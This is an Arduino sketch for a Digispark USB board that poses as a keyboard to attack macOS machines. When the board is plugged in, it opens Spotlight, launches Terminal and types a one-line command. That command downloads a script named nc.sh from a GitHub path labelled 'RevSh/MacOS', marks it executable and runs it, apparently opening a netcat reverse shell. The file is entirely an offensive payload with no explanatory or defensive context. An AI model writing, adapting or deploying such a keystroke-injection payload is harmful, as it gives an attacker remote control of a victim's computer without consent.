#include "DigiKeyboard.h"
void setup() {
DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(CONTROL, SPACE);
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke("terminal");
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke("cd && curl -o nc.sh https://raw.githubusercontent.com/7ext34/7ext-34/master/RevSh/MacOS/nc.sh && chmod +x nc.sh &&./nc.sh");
}

void loop() {
}

